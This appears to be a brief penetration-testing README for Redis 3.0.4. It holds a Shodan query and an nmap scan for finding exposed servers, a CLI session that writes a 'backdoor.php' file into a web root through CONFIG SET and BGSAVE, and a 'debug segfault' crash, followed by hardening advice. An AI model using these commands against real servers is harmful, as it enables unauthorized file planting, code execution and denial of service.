# Redis.turb
## *Redis.io* Penetration Testing (v3.0.4)
![GitHub Logo](/Redis_Logo.jpg)
##### Intro

*Redis.io* is an open source in-memory database developed to store volatile data as messages, cache, cookie, etc.

I beg you to read [Redis.io/security](http://redis.io/topics/security) if you have any intention to setup *Redis.io* in production.

##### Discover misconfigured *Redis.io*

*Shodan* :

` { product:"Redis key-value store", port:"6379" } `

*Nmap* :

`nmap -p 6379 -n --open --script=redis-info xxx.xxx.xxx.xxx/yy`

##### Upload malicious file

Requirement : access to CONFIG and BGSAVE or SAVE
```
localhost:6379> config set dir /var/www/html
OK
localhost:6379> config get dir
1) "dir"
2) "/var/www/html"
- - - - -
localhost:6379> config set dbfilename backdoor.php
OK
localhost:6379> config get dbfilename
1) "dbfilename"
2) "backdoor.php"
- - - - -
localhost:6379> set cmd "<?php phpinfo(); ?>"
OK
localhost:6379> bgsave
Background saving started
- - - - -
-rw-r--r-- 1 redis redis 45 Sep 19 17:01 backdoor.php
```

##### Denial Of Service

```
localhost:6379> debug segfault
(9.69s)
not connected> 
```

#### Security Best Practices


##### Enable authentication

Add to **redis.conf** :

`requirepass foobabar`

Thus, run *Redis.io* with your **redis.conf** file :

`redis-server /fullpath/to/redis.conf`

##### Only bind *Redis.io* to Loopback

Add to **redis.conf** :

`bind 127.0.0.1`

Allow access only from loopback (implied that the application that needs *Redis.io* running on the same host).

##### Fuzz Redis.io with OpenRCE/Sulley and AFL
[Lighting Talk](http://slides.com/tfairane/deck/live)

##### MUST READ
http://antirez.com/news/96

